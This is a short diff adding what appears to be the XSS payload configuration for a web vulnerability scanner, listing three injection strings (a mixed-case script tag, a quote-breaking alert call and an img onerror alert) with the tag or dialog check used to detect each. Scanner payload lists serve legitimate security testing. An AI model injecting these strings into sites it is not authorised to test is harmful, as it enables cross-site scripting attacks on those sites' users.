@@ -1,0 +1,18 @@
+Xss:
+  [
+    {
+    Payload: "<ScRiPt>%s</sCrIpT>",
+    CheckTag: "ScRiPt",
+    CheckType: "Value",
+    },
+    {
+    Payload: "';alert(%s);//",
+    CheckTag: "",
+    CheckType: "Dialog",
+    },
+    {
+      Payload: " <img src/onerror=alert(1)>",
+      CheckTag: "img",
+      CheckType: "Dialog",
+    }
+  ]
